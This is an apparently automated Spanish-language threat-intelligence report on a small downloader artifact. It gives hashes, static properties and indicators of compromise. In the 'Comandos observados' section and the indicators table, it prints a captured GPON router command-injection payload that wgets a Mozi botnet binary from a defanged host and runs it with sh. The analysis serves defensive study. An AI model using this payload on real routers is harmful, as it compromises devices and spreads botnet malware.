# 🧬 Payload Analysis

`2451f4325b8e99c0fe24a80d441455bda99bfe4512f9da78f1f6e148c154c52a`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 118 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:44:03.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `2451f4325b8e99c0fe24a80d441455bda99bfe4512f9da78f1f6e148c154c52a`
- **SHA1:** `f68feb4e007504f3f29dc0bf922e19589f0979e2`
- **MD5:** `f7e5e3252809e63e1950e99c67475cb5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.04 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+->/tmp/gpon80;sh+
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+- | strings |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+->/tmp/gpon80;sh+ | strings |
| hash | 2451f4325b8e99c0fe24a80d441455bda99bfe4512f9da78f1f6e148c154c52a | static_analysis |
| ip | 36.255.33.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
